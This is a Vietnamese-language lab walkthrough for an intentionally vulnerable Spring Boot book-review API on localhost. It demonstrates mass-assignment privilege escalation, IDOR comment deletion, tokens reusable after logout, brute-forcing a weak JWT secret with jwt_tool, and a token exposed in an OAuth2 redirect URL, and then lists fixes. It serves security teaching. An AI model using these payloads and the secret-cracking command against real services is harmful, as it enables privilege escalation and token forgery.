# 🔓 JWT + OAuth2 Security Vulnerabilities Demo

## 🚀 Chuẩn Bị Ban Đầu

### 1. Chạy ứng dụng
```powershell
cd "c:\Users\ADMIN\An Toàn Thông Tin\Bao_mat_API"
.\mvnw.cmd spring-boot:run
```

### 2. Truy cập Swagger UI
```
http://localhost:8080/swagger-ui/index.html
```

### 3. Xác minh database
- Kiểm tra SQL Server đã chạy
- Database `bookreview_db` đã tồn tại
- Table `books` có ít nhất 1 record (id=1)

---

## 📋 Kịch Bản 1: Mass Assignment (Privilege Escalation)

**Mục đích:** Tự nâng quyền từ USER → ADMIN khi register

### Bước 1: Mở Swagger UI
- Vào http://localhost:8080/swagger-ui/index.html

### Bước 2: Tìm endpoint `POST /api/auth/register`
- Bấm vào endpoint
- Bấm **Try it out**

### Bước 3: Nhập body malicious
```json
{
    "username": "attacker",
    "email": "attacker@gmail.com",
    "password": "123456",
    "role": "ADMIN"
}
```

### Bước 4: Bấm **Execute**

### ✅ Kết Quả Mong Đợi
**Response Status: 200 OK**
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "username": "attacker",
  "role": "ADMIN"
}
```

**🎯 Kết luận:** User "attacker" đã tự set role=ADMIN thành công!

**📸 Hãy chụp màn hình response này!**

---

## 🔄 Kịch Bản 2: IDOR (Insecure Direct Object Reference)

**Mục đích:** User B xóa comment của User A

### Bước 1: Register User A
- POST /api/auth/register
```json
{
    "username": "userA",
    "email": "userA@gmail.com",
    "password": "123456"
}
```
- **Lưu lại token_A từ response**

### Bước 2: Register User B
- POST /api/auth/register
```json
{
    "username": "userB",
    "email": "userB@gmail.com",
    "password": "123456"
}
```
- **Lưu lại token_B từ response**

### Bước 3: User A tạo comment trên book id=1
- Login bằng token_A:
  - Bấm nút **Authorize 🔒** bên phải màn hình
  - Nhập: `Bearer eyJhbGci...` (token_A)
  - Bấm **Authorize**

- POST /api/comments/book/1
```json
{
    "content": "Sách hay lắm! Comment của UserA",
    "parentId": null
}
```

- **Response sẽ trả comment_id (ví dụ id=1)**
```json
{
  "id": 1,
  "content": "Sách hay lắm! Comment của UserA",
  "username": "userA",
  "userId": 1,
  ...
}
```

### Bước 4: User B xóa comment của User A
- **Đăng xuất token_A:**
  - Bấm nút **Authorize 🔒**
  - Bấm **Logout**

- **Đăng nhập bằng token_B:**
  - Bấm **Authorize 🔒**
  - Nhập: `Bearer eyJhbGci...` (token_B)
  - Bấm **Authorize**

- DELETE /api/comments/1
  - **Không cần body**
  - **Bấm Execute**

### ✅ Kết Quả Mong Đợi
**Response Status: 200 OK**
```json
"Xóa comment thành công"
```

**🎯 Kết luận:** User B đã xóa comment của User A mà không bị chặn! → **IDOR vulnerability**

**📸 Hãy chụp màn hình DELETE request & response này!**

---

## ⏱️ Kịch Bản 3: No Token Blacklist After Logout

**Mục đích:** Token vẫn dùng được sau logout

### Bước 1: Login bất kỳ
- POST /api/auth/login
```json
{
    "username": "testuser",
    "password": "123456"
}
```
- **Lưu lại token từ response**
- Bấm **Authorize 🔒** và nhập token

### Bước 2: Call API thành công
- GET /api/books
  - **Bấm Execute**
  - **Response: Status 200 OK** ✓

**📸 Chụp màn hình request 1: GET /api/books thành công**

### Bước 3: Logout
- POST /api/auth/logout
  - **Không cần body**
  - **Bấm Execute**
  - **Response: Status 200** "Đăng xuất thành công"

**📸 Chụp màn hình logout response**

### Bước 4: Dùng token cũ call API lại
- **Vẫn giữ token trong Authorize** (không logout từ Swagger)
- GET /api/books
  - **Bấm Execute lần 2**

### ✅ Kết Quả Mong Đợi
**Response Status: 200 OK** - **books array được trả về**

**🎯 Kết luận:** Token cũ vẫn hoạt động sau logout! → **Không có token blacklist**

**📸 Chụp màn hình request 2: GET /api/books sau logout vẫn thành công (Status 200)**

---

## 🔐 Kịch Bản 4: JWT Weak Secret Brute Force

**Mục đích:** Crack JWT secret key bằng brute force

### Bước 1: Lấy 1 JWT token
- Login bất kỳ tài khoản
- **Copy token từ response**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0dXNlciIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzE2NzY2MDAwLCJleHAiOjE3MTY4NTIwMDB9.XXXXXX
```

### Bước 2: Cài đặt jwt_tool

**Terminal 1: Clone repository**
```powershell
cd $env:USERPROFILE\Desktop
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install pycryptodome
```

### Bước 3: Tạo wordlist
**File: `wordlist.txt` trong folder jwt_tool**
```
secret123
secret123secret123secret123secret1
password
123456
admin
qwerty
root
demo
test
```

### Bước 4: Chạy brute force
```powershell
cd c:\Users\ADMIN\Desktop\jwt_tool
python jwt_tool.py -t <TOKEN> -C -d wordlist.txt
```

**Thay `<TOKEN>` bằng token thực tế từ bước 1**

Ví dụ:
```powershell
python jwt_tool.py -t eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0dXNlciIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzE2NzY2MDAwLCJleHAiOjE3MTY4NTIwMDB9.XXXXXX -C -d wordlist.txt
```

### ✅ Kết Quả Mong Đợi
Một trong các dòng:
```
[+] secret123secret123secret123secret1 is the CORRECT key!
```

**🎯 Kết luận:** JWT secret quá yếu → bị crack trong vài giây!

**📸 Chụp màn hình dòng `[+] secret123secret123secret123secret1 is the CORRECT key!`**

---

## 🌐 Kịch Bản 5: OAuth2 Token Exposed in URL

**Mục đích:** Token JWT lộ trên URL (từ OAuth2 redirect)

### Bước 1: Mở tab browser mới
```
http://localhost:8080/oauth2/authorization/google
```

### Bước 2: Đăng nhập Google
- Chọn tài khoản Google
- Bấm Allow nếu được hỏi quyền

### Bước 3: Quan sát URL sau redirect
Sau khi đăng nhập Google xong, trình duyệt sẽ redirect tới:
```
http://localhost:8080/oauth2/success?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGdtYWlsLmNvbSIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzE2NzY2MDAwLCJleHAiOjE3MTY4NTIwMDB9.XXXXXX&name=Test+User
```

**🚨 Token JWT hiển thị đầy đủ trên URL!**

### ✅ Kết Quả Mong Đợi
- Quan sát URL trên thanh địa chỉ
- Thấy `token=eyJhbGci...` (token không được che)

### 🎯 Kết luận: Token lộ trên URL
- Bất kỳ ai nhìn thấy màn hình có thể copy token
- Browser history lưu URL này
- Server logs cũng ghi lại URL này
- Token này có thể bị ăn cắp nếu kết nối không HTTPS

**📸 Chụp màn hình URL với token hiển thị trên thanh địa chỉ!**

---

## 🎬 Tóm Tắt - Các Lỗ Hổng Tìm Được

| # | Kịch Bản | Lỗ Hổng | Tác Hại |
|---|----------|--------|--------|
| 1 | Mass Assignment | User tự set role=ADMIN | Privilege Escalation |
| 2 | IDOR | User B xóa comment User A | Data Tampering |
| 3 | No Blacklist | Token dùng được sau logout | Session Hijacking |
| 4 | Weak Secret | Brute force crack JWT | Token Forgery |
| 5 | URL Exposure | Token lộ trên URL | Token Stealing |

---

## ⚠️ Cách Fix (Tương Lai)

1. **Mass Assignment**: Xóa field `role` từ RegisterRequest
2. **IDOR**: Check ownership trước delete/update
3. **No Blacklist**: Implement token blacklist trong Redis
4. **Weak Secret**: Dùng secret key 32+ characters ngẫu nhiên
5. **URL Exposure**: Dùng POST redirect, lưu token trong HTTP-only cookie

---

## 📝 Ghi Chú

- **Đây là môi trường học tập** - các lỗ hổng được tạo ra cố ý
- **KHÔNG** sử dụng trên production
- Tất cả 5 kịch bản đều có code support sẵn trong ứng dụng
